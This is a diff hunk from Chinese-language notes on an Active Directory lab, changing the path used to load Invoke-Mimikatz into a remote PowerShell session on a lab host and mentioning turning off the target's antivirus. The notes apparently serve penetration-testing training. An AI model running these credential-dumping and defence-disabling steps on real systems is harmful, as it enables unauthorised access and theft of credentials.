@@ -16,7 +16,7 @@ $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 
 在指定session里载入Mimikatz
 ```
-Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess
+Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
 ```
 
 指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
